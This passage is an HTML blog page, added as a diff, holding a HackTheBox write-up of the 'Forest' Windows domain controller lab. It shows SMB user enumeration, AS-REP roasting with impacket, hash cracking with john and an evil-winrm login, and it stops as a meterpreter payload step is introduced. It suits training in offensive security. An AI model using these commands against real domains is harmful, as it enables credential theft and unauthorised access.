@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Forest | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2020/03/htb-forest.html" title="Read more" class="entry-title-link">
+                HTB: Forest</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-03-21T17:10:00+01:00">21 Mar 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/windows.html" title="Read more with the label windows" class="meta-link">windows</a> 
+          <a href="../../tag/winrm.html" title="Read more with the label winrm" class="meta-link">winrm</a> 
+          <a href="../../tag/pth.html" title="Read more with the label PTH" class="meta-link">PTH</a> 
+          <a href="../../tag/bloodhound.html" title="Read more with the label bloodhound" class="meta-link">bloodhound</a> 
+          <a href="../../tag/impacket.html" title="Read more with the label impacket" class="meta-link">impacket</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 18 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.03/forest_card.png" alt="Forest card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/212">Forest</a> published by
+<a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a> and
+<a href="https://www.hackthebox.eu/home/users/profile/2984">mrb3n</a> on October the 12th
+2019.
+This box is a Windows machine classified as easy.
+The server is a Domain Controller with 24 open ports.
+We will use Winrm, bloodhound and impacket to get both the user flag and the
+"root" flag.</p>
+
+
+<h1 id="recon">Recon</h1>
+<p>We start with an nmap scan. 24 ports are open. Using the service detection with
+gather several informations about the box:</p>
+<ul>
+<li>The server is a MS Windows Server 2008 R2</li>
+<li>The server is in the htb.local domain</li>
+<li>The server is in the HTB workgroup</li>
+</ul>
+<p>Here is the nmap scan:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Thu Oct 24 09:17:28 2019 as: nmap -p- -sSV -oA nmap_ssv 10.10.10.161</span>
+<span class="code-line">Nmap scan report for 10.10.10.161</span>
+<span class="code-line">Host is up (0.094s latency).</span>
+<span class="code-line">Not shown: 65511 closed ports</span>
+<span class="code-line">PORT      STATE SERVICE      VERSION</span>
+<span class="code-line">53/tcp    open  domain?</span>
+<span class="code-line">88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-24 07:29:09Z)</span>
+<span class="code-line">135/tcp   open  msrpc        Microsoft Windows RPC</span>
+<span class="code-line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span>
+<span class="code-line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span>
+<span class="code-line">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)</span>
+<span class="code-line">464/tcp   open  kpasswd5?</span>
+<span class="code-line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span>
+<span class="code-line">636/tcp   open  tcpwrapped</span>
+<span class="code-line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span>
+<span class="code-line">3269/tcp  open  tcpwrapped</span>
+<span class="code-line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="code-line">9389/tcp  open  mc-nmf       .NET Message Framing</span>
+<span class="code-line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="code-line">49664/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="code-line">49665/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="code-line">49666/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="code-line">49667/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="code-line">49669/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="code-line">49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span>
+<span class="code-line">49677/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="code-line">49684/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="code-line">49706/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="code-line">49915/tcp open  msrpc        Microsoft Windows RPC</span>
+<span class="code-line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
+<span class="code-line">SF-Port53-TCP:V=7.80%I=7%D=10/24%Time=5DB150FF%P=x86_64-pc-linux-gnu%r(DNS</span>
+<span class="code-line">SF:VersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version</span>
+<span class="code-line">SF:\x04bind\0\0\x10\0\x03&quot;);</span>
+<span class="code-line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+<span class="code-line"></span>
+<span class="code-line">Read data files from: /usr/bin/../share/nmap</span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Thu Oct 24 09:23:52 2019 -- 1 IP address (1 host up) scanned in 384.59 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<p>We use <code>getArch.py</code> from <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>
+to determine the machine Architecture, the machine is 64-bits.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python getArch.py -target 10.10.10.161</span>
+<span class="code-line">Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Gathering OS architecture for 1 machines</span>
+<span class="code-line">[*] Socket connect timeout set to 2 secs</span>
+<span class="code-line">10.10.10.161 is 64-bi</span>
+<span class="code-line"></code></pre></div>
+
+<p>We check the open ports using <a href="https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html">a useful website</a></p>
+<h2 id="port-88-kerberos">Port 88: Kerberos</h2>
+<p>We need an account to exploit this port.</p>
+<blockquote>
+<p>Kerberos is a protocol that is used for network authentication. Different versions are used by Unix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.</p>
+<p>If you already have a login to a user of that domain you might be able to escalate that privilege.</p>
+<p>Check out: MS14-068</p>
+</blockquote>
+<h2 id="port-m135-msrpc">Port M135: MSRPC</h2>
+<p>We enumerate using <code>nmap</code> and metasploit without success.</p>
+<blockquote>
+<p>This is the windows rpc-port. <a href="https://en.wikipedia.org/wiki/Microsoft_RPC">https://en.wikipedia.org/wiki/Microsoft_RPC</a>
+Enumerate
+nmap 192.168.0.101 --script=msrpc-enum</p>
+<p>msf &gt; use exploit/windows/dcerpc/ms03_026_dcom</p>
+</blockquote>
+<h2 id="port-139-smb">Port 139: SMB</h2>
+<blockquote>
+<p>Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server.</p>
+</blockquote>
+<h2 id="ports-389-and-636-ldap">Ports 389 and 636: LDAP</h2>
+<blockquote>
+<p>Lightweight Directory Access Protocol. This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation. Ldap is used more often in corporate structure. Webapplications can use ldap for authentication. If that is the case it is possible to perform ldap-injections which are similar to sqlinjections.</p>
+<p>You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users.</p>
+<p>ldapsearch -h 192.168.1.101 -p 389 -x -b "dc=mywebsite,dc=com"</p>
+</blockquote>
+<h2 id="ports-445-464-593-3269-49664-49665-49666-49667-49669-49676-49677-49684-49706-49915">Ports 445, 464, 593, 3269, 49664, 49665, 49666, 49667, 49669, 49676, 49677, 49684, 49706, 49915</h2>
+<p>Not included in the gitbook</p>
+<h2 id="port-5985-winrm">Port 5985: WinRM</h2>
+<p>Not included in the gitbook but a "well known" protocol.</p>
+<blockquote>
+<p>WinRM, or Windows Remote Management, is an HTTP based remote management and shell protocol for Windows. The Windows Remote Management Service is responsible for this functionality. If WinRM is not configured for remote access, but the service is started, it listens for local requests on TCP port 47001. If you create listener it will still listen on 47001, but also on the default TCP ports 5985 (HTTP) and 5986 (HTTPS).</p>
+</blockquote>
+<h2 id="port-3268-globalcatldap">Port 3268: globalcatLdap</h2>
+<p>No description</p>
+<h2 id="port-9389">Port 9389</h2>
+<blockquote>
+<p>Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).</p>
+</blockquote>
+<h2 id="port-47001-windows-remote-management-service">Port 47001: Windows Remote Management Service</h2>
+<p>No more information.</p>
+<h1 id="getting-user">Getting user</h1>
+<h2 id="enumerating-user-with-smb">enumerating user with SMB</h2>
+<p>The SMB port is open, we can enumerate local users. Moreover, as the server is a Domain
+Controller, every "local" user is a domain user.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 &gt; use auxiliary/scanner/smb/smb_enumusers</span>
+<span class="code-line">msf5 auxiliary(scanner/smb/smb_enumusers) &gt; set rhosts 10.10.10.161</span>
+<span class="code-line">rhosts =&gt; 10.10.10.161</span>
+<span class="code-line">msf5 auxiliary(scanner/smb/smb_enumusers) &gt; show options</span>
+<span class="code-line"></span>
+<span class="code-line">Module options (auxiliary/scanner/smb/smb_enumusers):</span>
+<span class="code-line"></span>
+<span class="code-line">  Name       Current Setting  Required  Description</span>
+<span class="code-line">  ----       ---------------  --------  -----------</span>
+<span class="code-line">  RHOSTS     10.10.10.161     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span>
+<span class="code-line">  SMBDomain  .                no        The Windows domain to use for authentication</span>
+<span class="code-line">  SMBPass                     no        The password for the specified username</span>
+<span class="code-line">  SMBUser                     no        The username to authenticate as</span>
+<span class="code-line">  THREADS    1                yes       The number of concurrent threads</span>
+<span class="code-line"></span>
+<span class="code-line">msf5 auxiliary(scanner/smb/smb_enumusers) &gt; run</span>
+<span class="code-line"></span>
+<span class="code-line">[+] 10.10.10.161:445      - HTB [ Administrator, Guest, krbtgt, DefaultAccount, $331000-VK4ADACQNUCA, SM_2c8eef0a09b545acb, SM_ca8c2ed5bdab4dc9b, SM_75a538d3025e4db9a, SM_681f53d4942840e18, SM_1b41c9286325456bb, SM_9b69f1b9d2cc45549, SM_7c96b981967141ebb, SM_c75ee099d0a64c91b, SM_1ffab36a2f5f479cb, HealthMailboxc3d7722, HealthMailboxfc9daad, HealthMailboxc0a90c9, HealthMailbox670628e, HealthMailbox968e74d, HealthMailbox6ded678, HealthMailbox83d6781, HealthMailboxfd87238, HealthMailboxb01ac64, HealthMailbox7108a4e, HealthMailbox0659cc1, sebastien, lucinda, svc-alfresco, andy, mark, santi ] ( LockoutTries=0 PasswordMin=7 )</span>
+<span class="code-line">[*] 10.10.10.161:         - Scanned 1 of 1 hosts (100% complete)</span>
+<span class="code-line">[*] Auxiliary module execution completed</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="getting-npusers">Getting NPUsers</h2>
+<p><code>UF_DONT_REQUIRE_PREAUTH</code></p>
+<blockquote>
+<p>This bit indicates that there is no so-called pre-authentication necessary for Kerberos authentication of the account. This is only for older Kerberos client important, which need to login to the domain from foreign systems and which does not support Kerberos pre-authentication. For accounts that log on from a Windows machine, or just for machine accounts of Windows domain members, this flag flag should NEVER be set, for the pre-authentication prevents certain types of dictionary attacks on the Kerberos login.</p>
+</blockquote>
+<p>We create a file with the users.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat users.txt</span>
+<span class="code-line">sebastien</span>
+<span class="code-line">lucinda</span>
+<span class="code-line">svc-alfresco</span>
+<span class="code-line">andy</span>
+<span class="code-line">mark</span>
+<span class="code-line">santi</span>
+<span class="code-line"></code></pre></div>
+
+<p>In order to use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">impacket's</a> <code>GetNPUsers.py</code>
+we need to add an entry in our <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat /etc/hosts</span>
+<span class="code-line">127.0.0.1   localhost</span>
+<span class="code-line">127.0.1.1   kalili</span>
+<span class="code-line">10.10.10.161    htb.local</span>
+<span class="code-line">10.10.10.161    forest.htb.local</span>
+<span class="code-line"></code></pre></div>
+
+<p>And we launch <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">impacket's</a> <code>GetNPUsers.py</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -format john</span>
+<span class="code-line">Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies</span>
+<span class="code-line"></span>
+<span class="code-line">[-] User sebastien doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="code-line">[-] User lucinda doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="code-line">$krb5asrep$svc-alfresco@HTB.LOCAL:bcd2217d8b5e6884e25d8b2860dd0380$40be3fda5f8fd984f9c576d5dfa33f37effc76b0fbff3ae28a747825c3559bfea4a6a23ad1c0add8ad61d149a5ccc2e79919de9b78e8720b3dc79af96364fb6f5d7e0235eb83850765023a30de6d172c82ec751f50f4c6e4971cb54a46e16ec2d3a41b9f44b6b8e85782d958c3ff665baa5b29d8c5b4516ec1b63f7c63b55c5fa74b7b1b5fe1fa04cddac6812d0ef37f1e25ab8e8005fe7f6ce949786435c41a2395e73e9bf1de57e3a2da12a00f9da25408e92a37a5ed2dacdbbf3846963000f7b2f8d337d152345a9cc7358b5d45224abeac179f081b9b329e549659da00ac791a7fde1a8c</span>
+<span class="code-line">[-] User andy doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="code-line">[-] User mark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="code-line">[-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set</span>
+<span class="code-line">[-] invalid principal syntax</span>
+<span class="code-line"></code></pre></div>
+
+<p>We crack the password using john and the rockyou dictionary. The user's
+password is "s3rvice".</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>john hashes -w=~/tools/password_lists/rockyou.txt</span>
+<span class="code-line">Warning: detected hash type &quot;krb5asrep&quot;, but the string is also recognized as &quot;krb5asrep-aes-opencl&quot;</span>
+<span class="code-line">Use the &quot;--format=krb5asrep-aes-opencl&quot; option to force loading these as that type instead</span>
+<span class="code-line">Using default input encoding: UTF-8</span>
+<span class="code-line">Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])</span>
+<span class="code-line">Will run 4 OpenMP threads</span>
+<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
+<span class="code-line">0g 0:00:00:02 11.59% (ETA: 11:52:21) 0g/s 913958p/s 913958c/s 913958C/s eddie707..eck1956</span>
+<span class="code-line">s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)</span>
+<span class="code-line">1g 0:00:00:04 DONE (2019-10-24 11:52) 0.2237g/s 914040p/s 914040c/s 914040C/s s401413..s3r1bu</span>
+<span class="code-line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span>
+<span class="code-line">Session completed</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="ms14-068">MS14-068</h2>
+<p>In order to run MS14-068 we need the SUID of our user. We enumerate them using
+metasploit. Our user SID is <code>S-1-5-21-3072663084-364016917-1341370565-1147</code> (domain
+SID-User RID).</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 auxiliary(admin/kerberos/ms14_068_kerberos_checksum) &gt; use auxiliary/scanner/smb/smb_lookupsid</span>
+<span class="code-line">msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; show options</span>
+<span class="code-line"></span>
+<span class="code-line">Module options (auxiliary/scanner/smb/smb_lookupsid):</span>
+<span class="code-line"></span>
+<span class="code-line">  Name       Current Setting  Required  Description</span>
+<span class="code-line">  ----       ---------------  --------  -----------</span>
+<span class="code-line">  MaxRID     4000             no        Maximum RID to check</span>
+<span class="code-line">  MinRID     500              no        Starting RID to check</span>
+<span class="code-line">  RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span>
+<span class="code-line">  SMBDomain  .                no        The Windows domain to use for authentication</span>
+<span class="code-line">  SMBPass                     no        The password for the specified username</span>
+<span class="code-line">  SMBUser                     no        The username to authenticate as</span>
+<span class="code-line">  THREADS    1                yes       The number of concurrent threads</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Auxiliary action:</span>
+<span class="code-line"></span>
+<span class="code-line">  Name   Description</span>
+<span class="code-line">  ----   -----------</span>
+<span class="code-line">  LOCAL  Enumerate local accounts</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 10.10.10.161</span>
+<span class="code-line">RHOSTS =&gt; 10.10.10.161</span>
+<span class="code-line">msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBDomain HTB.LOCAL</span>
+<span class="code-line">SMBDomain =&gt; HTB.LOCAL</span>
+<span class="code-line">msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUser svc-alfresco</span>
+<span class="code-line">SMBUser =&gt; svc-alfresco</span>
+<span class="code-line">msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPass s3rvice</span>
+<span class="code-line">SMBPass =&gt; s3rvice</span>
+<span class="code-line">msf5 auxiliary(scanner/smb/smb_lookupsid) &gt; run</span>
+<span class="code-line"></span>
+<span class="code-line">[*] 10.10.10.161:445      - PIPE(LSARPC) LOCAL(HTB - 5-21-3072663084-364016917-1341370565) DOMAIN(HTB - 5-21-3072663084-364016917-1341370565)</span>
+<span class="code-line">[*] 10.10.10.161:445      - USER=Administrator RID=500</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">[*] 10.10.10.161:445      - USER=lucinda RID=1146</span>
+<span class="code-line">[*] 10.10.10.161:445      - USER=svc-alfresco RID=1147</span>
+<span class="code-line">[*] 10.10.10.161:445      - GROUP=Service Accounts RID=1148</span>
+<span class="code-line">[*] 10.10.10.161:445      - GROUP=Privileged IT Accounts RID=1149</span>
+<span class="code-line">[*] 10.10.10.161:445      - USER=andy RID=1150</span>
+<span class="code-line">[*] 10.10.10.161:445      - USER=mark RID=1151</span>
+<span class="code-line">[*] 10.10.10.161:445      - USER=santi RID=1152</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can also try to get Users SPNs</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>python GetUserSPNs.py -request htb.local/svc-alfresco:s3rvice</span>
+<span class="code-line">Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies</span>
+<span class="code-line"></span>
+<span class="code-line">No entries found</span>
+<span class="code-line"></code></pre></div>
+
+<p>We add the DC to our <code>/etc/resolv.conf</code> and install <code>rdate</code> to have the same
+time as the DC.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat /etc/resolv.conf</span>
+<span class="code-line"># Generated by NetworkManager</span>
+<span class="code-line">search home</span>
+<span class="code-line">nameserver 192.168.1.25</span>
+<span class="code-line">domain htb.local</span>
+<span class="code-line">search htb.local</span>
+<span class="code-line"></span>
+<span class="code-line">apt-get install rdate</span>
+<span class="code-line"></span>
+<span class="code-line">rdate -n htb.local</span>
+<span class="code-line">Thu Oct 24 16:22:14 CEST 2019</span>
+<span class="code-line"></code></pre></div>
+
+<p>I know have the same time as the DC (this is super important for tickets
+generation).</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>date &amp;&amp; rdate -n htb.local</span>
+<span class="code-line">Thu 24 Oct 2019 04:24:55 PM CEST</span>
+<span class="code-line">Thu Oct 24 16:24:55 CEST 2019</span>
+<span class="code-line"></code></pre></div>
+
+<p>The exploitation of MS14-068 does not work.</p>
+<h2 id="evil-winrm">Evil-winrm</h2>
+<p>As we so in the openport, the
+<a href="https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management">default port for winrm 5985</a>
+is open. We use <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> in order
+to connect to the system and get user's flag:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice</span>
+<span class="code-line"></span>
+<span class="code-line">Evil-WinRM shell v1.8</span>
+<span class="code-line"></span>
+<span class="code-line">Info: Establishing connection to remote endpoint</span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; dir</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">    Directory: C:\Users\svc-alfresco\Documents</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Mode                LastWriteTime         Length Name</span>
+<span class="code-line">----                -------------         ------ ----</span>
+<span class="code-line">-a----       10/24/2019   6:57 AM          12510 20191024065705_BloodHound.zip</span>
+<span class="code-line">-a----       10/24/2019   8:23 AM           3996 Add-ACE.ps1</span>
+<span class="code-line">-a----       10/24/2019   8:23 AM           2584 Add-ToGroup.ps1</span>
+<span class="code-line">-a----       10/24/2019   6:28 AM          64384 Invoke-ACLPwn.ps1</span>
+<span class="code-line">-a----       10/24/2019   8:02 AM        2661697 Invoke-Mimikatz.ps1</span>
+<span class="code-line">-a----       10/24/2019   6:33 AM        1006744 mimikatz.exe</span>
+<span class="code-line">-a----       10/24/2019   6:25 AM         212992 mp1.exe</span>
+<span class="code-line">-a----       10/24/2019   9:17 AM          43696 nc64.exe</span>
+<span class="code-line">-a----       10/24/2019   6:47 AM          73802 pd.exe</span>
+<span class="code-line">-a----       10/24/2019   7:24 AM           6017 powerPriv.ps1</span>
+<span class="code-line">-a----       10/24/2019   9:26 AM         363295 powerview.ps1</span>
+<span class="code-line">-a----       10/24/2019   7:12 AM           8978 Rk9SRVNU.bin</span>
+<span class="code-line">-a----       10/24/2019   6:27 AM         779264 SharpHound.exe</span>
+<span class="code-line">-a----       10/24/2019   6:44 AM         919546 SharpHound.ps1</span>
+<span class="code-line">-a----       10/24/2019   8:36 AM        2222592 SharpSploit.dll</span>
+<span class="code-line">-a----       10/24/2019   7:26 AM          73802 shell.exe</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; cd ../</span>
+<span class="code-line">di*Evil-WinRM* PS C:\Users\svc-alfresco&gt; dir</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">    Directory: C:\Users\svc-alfresco</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Mode                LastWriteTime         Length Name</span>
+<span class="code-line">----                -------------         ------ ----</span>
+<span class="code-line">d-r---        9/23/2019   2:16 PM                Desktop</span>
+<span class="code-line">d-r---       10/24/2019   9:31 AM                Documents</span>
+<span class="code-line">d-r---        7/16/2016   6:18 AM                Downloads</span>
+<span class="code-line">d-r---        7/16/2016   6:18 AM                Favorites</span>
+<span class="code-line">d-r---        7/16/2016   6:18 AM                Links</span>
+<span class="code-line">d-r---        7/16/2016   6:18 AM                Music</span>
+<span class="code-line">d-r---        7/16/2016   6:18 AM                Pictures</span>
+<span class="code-line">d-----        7/16/2016   6:18 AM                Saved Games</span>
+<span class="code-line">d-r---        7/16/2016   6:18 AM                Videos</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\svc-alfresco&gt; dir Desktop</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">    Directory: C:\Users\svc-alfresco\Desktop</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Mode                LastWriteTime         Length Name</span>
+<span class="code-line">----                -------------         ------ ----</span>
+<span class="code-line">-ar---        9/23/2019   2:16 PM             32 user.txt</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">*Evil-WinRM* PS C:\Users\svc-alfresco&gt; type Desktop\user.txt</span>
+<span class="code-line">e5e4e&lt;redacted&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="getting-root">Getting root</h1>
+<h2 id="evil-winrm-and-binary">evil-winrm and binary</h2>
+<p>Using evil-Winrm we can also check the domain SID (and our user SID):</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>whoami /user</span>
+<span class="code-line">USER INFORMATION</span>
+<span class="code-line">----------------</span>
+<span class="code-line"></span>
+<span class="code-line">User Name        SID</span>
+<span class="code-line">================ =============================================</span>
+<span class="code-line">htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147</span>
+<span class="code-line"></code></pre></div>
+
+<p>Using evil-winrm we can easily upload a binary using the <code>upload</code> function.
+Nevertheless I was not able to invoke the binary using the <code>Invoke-binary</code>
+command. Therefore I used a simple ruby script to get on the machine a launch a
+msfvenom meterprter:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="nb">require</span> <span class="s1">&#39;winrm&#39;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="o">.</span><span class="n">new</span><span class="p">(</span></span>
+<span class="code-line">  <span class="ss">endpoint</span><span class="p">:</span> <span class="s1">&#39;http://10.10.10.161:5985/wsman&#39;</span><span class="p">,</span></span>
+<span class="code-line">  <span class="ss">user</span><span class="p">:</span> <span class="s1">&#39;svc-alfresco&#39;</span><span class="p">,</span></span>
+<span class="code-line">  <span class="ss">password</span><span class="p">:</span> <span class="s1">&#39;s3rvice&#39;</span><span class="p">,</span></span>
+<span class="code-line"><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">command</span><span class="o">=</span><span class="s2">&quot;&quot;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">conn</span><span class="o">.</span><span class="n">shell</span><span class="p">(</span><span class="ss">:powershell</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">shell</span><span class="o">|</span></span>
+<span class="code-line">    <span class="k">until</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;exit</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="k">do</span></span>
+<span class="code-line">        <span class="nb">print</span> <span class="s2">&quot;PS &gt; &quot;</span></span>
+<span class="code-line">        <span class="n">command</span> <span class="o">=</span> <span class="nb">gets</span></span>
+<span class="code-line">        <span class="n">output</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span><span class="o">|</span></span>
+<span class="code-line">            <span class="no">STDOUT</span><span class="o">.</span><span class="n">print</span> <span class="n">stdout</span></span>
+<span class="code-line">            <span class="no">STDERR</span><span class="o">.</span><span class="n">print</span> <span class="n">stderr</span></span>
+<span class="code-line">        <span class="k">end</span></span>
+<span class="code-line">    <span class="k">end</span></span>
+<span class="code-line">    <span class="nb">puts</span> <span class="s2">&quot;Exiting with code </span><span class="si">#{</span><span class="n">output</span><span class="o">.</span><span class="n">exitcode</span><span class="si">}</span><span class="s2">&quot;</span></span>
+<span class="code-line"><span class="k">end</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>The msfvenom command to generate the meterpreter is the following:</p>
